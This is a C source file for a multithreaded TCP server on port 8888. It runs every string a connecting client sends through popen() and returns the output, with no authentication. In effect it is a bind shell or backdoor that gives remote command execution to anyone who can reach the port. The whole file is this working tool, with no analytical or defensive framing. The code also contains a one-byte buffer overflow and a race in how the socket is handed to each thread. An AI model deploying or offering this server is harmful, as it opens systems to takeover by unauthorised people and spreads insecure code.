#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PORT 8888
#define BUFFER_SIZE 1024
#define MAX_CLIENTS 10

void *handle_client(void *client_socket);

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size;
    pthread_t tid;
  
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("[-] Socket error");
        exit(EXIT_FAILURE);
    }
    printf("[+] TCP Server Socket created.\n");

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Bind error");
        exit(EXIT_FAILURE);
    }
    printf("[+] Bind successful.\n");

    if (listen(server_socket, MAX_CLIENTS) < 0) {
        perror("[-] Listen error");
        exit(EXIT_FAILURE);
    }
    printf("[+] Listening on port %d...\n", PORT);

    while (1) {
        addr_size = sizeof(client_addr);
        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);
        if (client_socket < 0) {
            perror("[-] Accept error");
            continue;
        }

        printf("[+] Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        pthread_create(&tid, NULL, handle_client, (void *)&client_socket);
        pthread_detach(tid);
    }

    close(server_socket);
    return 0;
}

void *handle_client(void *client_socket) {
    int sock = *(int *)client_socket;
    char buffer[BUFFER_SIZE];
    int bytes_received;
    FILE *fp;
    char output[BUFFER_SIZE];

    while ((bytes_received = recv(sock, buffer, BUFFER_SIZE, 0)) > 0) {
        buffer[bytes_received] = '\0';
        printf("[Client]: %s\n", buffer);

        if (strcmp(buffer, "exit") == 0) {
            printf("[-] Client disconnected.\n");
            break;
        }

        fp = popen(buffer, "r");
        if (fp == NULL) {
            send(sock, "Error executing command.\n", 25, 0);
            continue;
        }

        while (fgets(output, sizeof(output), fp) != NULL) {
            send(sock, output, strlen(output), 0);
        }

        pclose(fp);
    }

    close(sock);
    pthread_exit(NULL);
}
